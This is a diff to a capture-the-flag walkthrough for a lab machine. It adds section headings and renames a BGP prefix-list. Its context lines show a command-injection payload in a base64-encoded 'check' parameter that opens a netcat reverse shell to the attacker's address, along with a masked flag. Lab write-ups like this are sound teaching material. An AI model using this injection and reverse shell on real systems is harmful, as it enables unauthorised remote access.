@@ -18,6 +18,8 @@ A tricky machine. It needed a lot of network configuration learning, some RCE an
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
 
+## Enumeration
+
 First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).
 
 ```bash
@@ -151,6 +153,8 @@ Upgrade-Insecure-Requests: 1
 check=cXVhZ2dh
 ```
 
+## Shell as a user
+
 The `check` parameter gets value `quagga` and then displays the diagnostics for that process. So, if we did something like `quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <myip> 4444 >/tmp/f` as the value for check parameter and start a `ncat` listener on my machine, I should get a shell. Let's try it (Don't forget to convert the command to Base64).
 
 ```bash
@@ -166,6 +170,8 @@ user.txt
 cat user.txt
 56******************************
 ```
+
+## Privilege escalation by BGP
 
 I got the user.txt file in a root shell?! There's something else on the network. When I checked the web login, I found a `Tickets` menu and an image which looked like a network diagram. Might be relevant here.
 
@@ -293,7 +299,7 @@ router bgp 100
  neighbor 10.78.11.2 remote-as 300
  neighbor 10.78.11.2 route-map to-as300 out
 !
-ip prefix-list 0xdf seq 5 permit 10.120.15.0/25
+ip prefix-list pswapnil seq 5 permit 10.120.15.0/25
 !
 route-map to-as200 permit 10
 !
